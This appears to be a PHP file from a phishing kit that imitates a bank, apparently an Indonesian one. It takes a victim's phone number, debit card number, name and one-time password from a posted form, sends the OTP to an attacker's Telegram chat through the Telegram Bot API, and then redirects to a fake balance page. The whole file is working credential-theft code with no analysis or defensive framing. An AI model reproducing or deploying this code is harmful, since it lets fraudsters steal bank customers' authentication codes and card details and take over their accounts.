<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorku"] = $_POST ['nomorku'];
$_SESSION["debit"] = $_POST ['debit'];
$_SESSION["nama"] = $_POST ['nama'];

$message = "༺═──⚸ℂ𝕊-𝔹𝕋ℕ☭──═༻". "\n𝕂𝕠𝕕𝕖 𝕆𝕋ℙ : ".  $_POST ['otp'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  saldo.html");
?> 